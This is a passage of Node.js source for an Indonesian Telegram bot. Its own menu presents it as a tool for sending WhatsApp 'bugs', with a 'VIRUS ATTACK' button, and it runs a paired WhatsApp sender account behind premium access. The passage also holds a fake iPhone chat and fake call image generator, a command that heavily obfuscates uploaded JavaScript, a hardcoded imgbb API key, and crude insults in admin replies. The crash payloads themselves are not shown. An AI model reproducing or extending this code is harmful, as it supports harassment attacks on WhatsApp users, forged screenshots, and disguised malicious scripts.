  if (choice === "rock") return "🪨 Batu";
  if (choice === "paper") return "📄 Kertas";
  if (choice === "scissors") return "✂️ Gunting";
  return "-";
}

function suitWin(a, b) {
  if (a === b) return "draw";
  if (
    (a === "rock" && b === "scissors") ||
    (a === "paper" && b === "rock") ||
    (a === "scissors" && b === "paper")
  ) return "p1";
  return "p2";
}

function suitPickKeyboard(chatId, gameId) {
  return {
    inline_keyboard: [
      [
        { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gameId}_rock` },
        { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gameId}_paper` },
        { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gameId}_scissors` }
      ]
    ]
  };
}

//---------(HANDLER BLOCK CMD ) ---------//
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

//---------(HANDLER APPROVED GB ) ---------//
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");

let approvedGroups = [];
let pendingGroups = new Map();

function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const raw = fs.readFileSync(APPROVED_GROUPS_FILE, "utf8");
      const parsed = JSON.parse(raw);
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    } else {
      approvedGroups = [];
    }
  } catch (err) {
    console.error("Gagal load approved groups:", err.message);
    approvedGroups = [];
  }
}

function saveApprovedGroups() {
  try {
    fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2));
  } catch (err) {
    console.error("Gagal save approved groups:", err.message);
  }
}

function isOwner(id) {
  return String(id) === String(ownerID);
}

function isGroupApproved(chatId) {
  return approvedGroups.includes(String(chatId));
}

loadApprovedGroups();

const premiumFile = './database/premium.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
    console.log(chalk.bold.yellow(`
⬡═―—―—————————————═⬡
 ⌑ Developer : @FadzxGanteng
 ⌑ Version : 15.00 Latest 
 ⌑ Status : Bot Connection 
⬡═―—―—————————————═⬡
`));

const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Sudah Terhubung
╘—————————————————═⬡
</pre></blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⬡═―—―—————————————═⬡
 ⌑ Developer : @FadzxGanteng
 ⌑ Version : 15.00 Latest 
 ⌑ Status : Sender Connection 
⬡═―—―—————————————═⬡
`));

        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234GINA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status Bot : Belum Terhubung
╘═——————————————═⬡
</pre></blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(ThumbnailPairing, {
  caption: pairingMenu,
  parse_mode: "HTML",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "SALIN CODE",
          copy_text: {
            text: formattedCode
          }
        }
      ]
    ]
  }
});

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote><pre>
⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status Bot : Sudah Terhubung
╘═——————————————═⬡
</pre></blockquote>`;

      try {
        await bot.telegram.editMessageCaption(
  lastPairingMessage.chatId,
  lastPairingMessage.messageId,
  undefined,
  updateConnectionMenu,
  {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "SALIN CODE",
            copy_text: {
              text: lastPairingMessage.pairingCode
            }
          }
        ]
      ]
    }
  }
);
      } catch (e) {
      }
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

//---------(MIDDLEWARE PERIZINAN GROUP ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();

  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();

  const chatId = String(ctx.chat.id);

  // command khusus approval tetap boleh
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";

  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];

  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Group ini belum di-approved oleh owner untuk melanjutkan silahkan 🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }

  return next();
});

//---------(MIDDLEWARE JAHSER FITUR ) ---------//
bot.use(async (ctx, next) => {
  try {
    if (ctx.chat) {
      if (ctx.chat.type === "private") {
        userDb.add(ctx.chat.id);
      } else if (["group", "supergroup"].includes(ctx.chat.type)) {
        groupDb.add(ctx.chat.id);
      }
    }
  } catch (e) {
    console.log("TRACK CHAT ERROR:", e.message);
  }

  return next();
});

//---------(MIDDLEWARE BLOCK CMD ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  // command manajemen block jangan ikut diblok oleh middleware ini
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});

// ==============================
// CONTOH COMMAND
// ==============================
// ==============================
// CONTOH COMMAND
// ==============================
bot.start(async (ctx) => {
    const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
  const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
  const runtimeStatus = formatRuntime();

  const menuMessage = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ ─ⓘ─
/*
Привет, я бот, который полезен для отправки ошибок WhatsApp через Telegram.
Я был создан @FadzxGanteng.

Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.*/
──────────────────────────
-# Metadata Intelligence
const VERSION   = "LATEST";
const DEVELOPER = "@FadzxGanteng";
const SESSIONS  = "${senderStatus}";
const PREMIUM   = "${premiumStatus}";
const RUNTIME   = "${runtimeStatus}";
\`\`\``;

  const keyboard = [
        [        
            { text: "ᐯ丨尺ㄩ丂 卂ㄒㄒ卂匚Ҝ", callback_data: "/bugg_menuu", style: "success", icon_custom_emoji_id:  "5425077563577890102" },
            { text: "丂乇ㄒㄒ丨几Ꮆ丂  爪乇几ㄩ", callback_data: "/settings_menu", style: "success", icon_custom_emoji_id:  "5350725709679584478" }
        ],
        [
            { text: "卂ㄥㄥ 爪乇几ㄩ", callback_data: "/all_menu", style: "danger", icon_custom_emoji_id:  "5197429921634346862" }
        ],
        [
            { text: "ᗪ乇ᐯ乇ㄥㄖ卩乇尺", url: "https://t.me/FadzxGanteng", style: "Primary", icon_custom_emoji_id:  "4904848288345228262" },
            { text: "匚卄卂几几乇ㄥ 丂匚尺丨卩ㄒ", url: "https://t.me/DaredevilXTeam", style: "Primary", icon_custom_emoji_id:  "4915820259044230152" }
        ]
    ];

   ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
  const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
  const runtimeStatus = formatRuntime();

  const menuMessage = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ ─ⓘ─
/*
Привет, я бот, который полезен для отправки ошибок WhatsApp через Telegram.
Я был создан @FadzxGanteng.

Пожалуйста, используйте этого бота разумно и ответственно.
Наслаждайтесь.*/
──────────────────────────
-# Metadata Intelligence
const VERSION   = "LATEST";
const DEVELOPER = "@FadzxGanteng";
const SESSIONS  = "${senderStatus}";
const PREMIUM   = "${premiumStatus}";
const RUNTIME   = "${runtimeStatus}";
\`\`\``;

  const keyboard = [
        [        
            { text: "ᐯ丨尺ㄩ丂 卂ㄒㄒ卂匚Ҝ", callback_data: "/bugg_menuu", style: "success", icon_custom_emoji_id:  "5425077563577890102" },
            { text: "丂乇ㄒㄒ丨几Ꮆ丂  爪乇几ㄩ", callback_data: "/settings_menu", style: "success", icon_custom_emoji_id:  "5350725709679584478" }
        ],
        [
            { text: "卂ㄥㄥ 爪乇几ㄩ", callback_data: "/all_menu", style: "danger", icon_custom_emoji_id:  "5197429921634346862" }
        ],
        [
            { text: "ᗪ乇ᐯ乇ㄥㄖ卩乇尺", url: "https://t.me/FadzxGanteng", style: "Primary", icon_custom_emoji_id:  "4904848288345228262" },
            { text: "匚卄卂几几乇ㄥ 丂匚尺丨卩ㄒ", url: "https://t.me/DaredevilXTeam", style: "Primary", icon_custom_emoji_id:  "4915820259044230152" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "Markdown",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action("coming_soon", async (ctx) => {
  await ctx.answerCbQuery(
    "⛔ Anda Telah Di Menu Utama ⛔",
    { show_alert: true }
  );
});

bot.action("menu_akhir", async (ctx) => {
  await ctx.answerCbQuery(
    "⛔ Anda Telah Di Menu Akhir ⛔",
    { show_alert: true }
  );
});

bot.action('/all_menu', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "YES" : "NO";
    const senderStatus = isWhatsAppConnected ? "ACTIVE" : "NO";
    const runtimeStatus = formatRuntime();
    const all_menuMenu = `\`\`\`js
( 🕊️ ) ─ ＸＨＵＮＴＥＲ 
/*𖤍 ご利用いただきありがとうございます X-hunter スクリプトのバグ Telegram Ϟ*/

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖡𝖮𝖳 ⊰—═⬡
const AUTHOR = "@FadzxGanteng"
const PENGGUNA = "@${ctx.from.username || "Tidak Ada"}"
const VERSION = "15.7 Latest"
const TYPE = "(Telegraf)"
const DATABASE = "MongoDB"
const OTP SYSTEM = "ACTIVE"
const SESSIONS = "${senderStatus}"
const PREMIUM = "${premiumStatus}"
const RUNTIME = "${runtimeStatus}"

⬡═—⊱ 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 𝖲𝖸𝖲𝖳𝖤𝖬 ⊰—═⬡
const VERIFICATION = "ACTIVE"
const ENCRYPTED = "ACTIVE"
const ENABLE OTP = "YES"
const BOT RUNNING = "NODE JS"

